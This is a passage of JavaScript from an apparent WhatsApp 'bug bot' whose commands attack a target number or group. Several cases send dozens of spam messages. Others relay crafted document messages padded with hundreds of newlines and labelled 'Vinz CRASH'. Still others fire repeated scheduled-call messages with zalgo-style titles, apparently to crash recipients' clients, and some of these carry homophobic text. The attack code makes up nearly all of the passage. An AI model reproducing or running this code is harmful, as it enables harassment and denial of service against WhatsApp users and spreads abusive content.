vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
replywalu(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case 'gasfullgc' : {
 if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
 await loading()
rumgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@g.us"
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(rumgc, { image: thumb,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
 case 'santetgc' : {
 if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
 await loading()
rumgc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@g.us"
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
vinz.sendMessage(rumgc, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case 'docux': case '😬': case '🦠': case '🤙': 
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
if (args.length == 0) return replywalu(`Example: ${prefix + command} 62888888,5`)
bnnd = dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"[0]
jumlah = args.join("|")[1]
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Vinz X7🤩🤩⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal} ${mentahanv}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` Vinz CRASH ${buttonkal} ${mentahanv}`,
}

}), { userJid: m.chat, quoted: vinzsticker})
vinz.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
await sleep(100)
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
case 'cleargc': case 'matigc':
case 'deadgc': case 'bantaigc':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
if (args.length == 0) return replywalu(`Example: ${prefix + command} idgc,5`)
bnnd = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = dtext.split(",")[1]
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Vinz X7🦠🦠🦠⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${bugui} ${mentahanv}.txt`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` Vinz CRASH ${bugui} ${mentahanv}`,
}

}), { userJid: m.chat, quoted: vinzsticker})
vinz.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
await sleep(100)
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
case 'unlipending': case 'unliattention': case 'unlinegro': case 'unlischedule': case 'xandro': case 'xsistem': case 'xschedule': case '++schedule': case 'scheduleobject': case 'scheduleobject': {
if (!isAuthor) return replyv1(mess.Author)
await loading()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = "3"
attention = async (teks) => {
let schedule = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: m.chat, quoted: kalgans })
vinz.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
attention(`𝐙𝚺͟𝐓𝐒𝐔𝐁𝚶𝐗͟𝐘𝐆 😈̸̦̣͛͘ removed gay ♣️_🌈̞⃜ ...~${antigay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`©ཱི⃟༐𖧾𝐙̸𝚺𝐓𝐒̸𝐔𝐁𝚯𝐗̸𝐘𝐆̶̸𝚺𝐍༑꧉${antigay}${ios1}.${ios2}`)
await sleep(500) 
